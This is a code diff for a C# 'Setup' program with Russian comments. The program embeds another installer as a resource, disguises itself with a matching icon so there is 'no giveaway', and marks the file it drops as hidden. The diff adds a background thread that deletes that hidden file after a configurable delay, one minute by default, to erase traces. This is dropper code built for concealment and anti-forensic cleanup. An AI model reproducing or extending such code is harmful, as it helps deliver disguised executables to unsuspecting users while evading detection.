@@ -2,6 +2,7 @@
 using System.IO;
 using System.Reflection;
 using System.Diagnostics;
+using System.Threading;
 
 namespace Setup
 {
@@ -11,6 +12,7 @@ namespace Setup
             ИНСТРУКЦИЯ:
             Закинуть файл устновщик софта в проект. В свойствах выбрать файла в студии, в пункте "Действие при сборке" выбрать "Внедрённый ресурс"(У файла не должно быть имя Setup.exe).
             Выбрать соответсвующую иконку для приложения чтобы вообще без палева.
+            На своё усмотрение дописать через сколько удалится файл, по умолчанию одна минута
             Скомпилить
         */
         static void Main(string[] args)
@@ -50,7 +52,13 @@ namespace Setup
         static void SetGhostFile(string pathFile)
         {
             File.SetAttributes(pathFile, FileAttributes.Hidden);
-
+            Thread deleted = new Thread(() =>
+            {
+                Thread.Sleep(1000 * 60);//-------------------------------Сюда дописать через какой промежуток времени скрытый файл удалится. По умолчанию 1 мин;
+                File.Delete(pathFile);
+            });
+            deleted.IsBackground = false; //Говорим что поток будет работать независимо от приложения.
+            deleted.Start();
         }
         static void StartTruInstaller(string pathFile)
         {
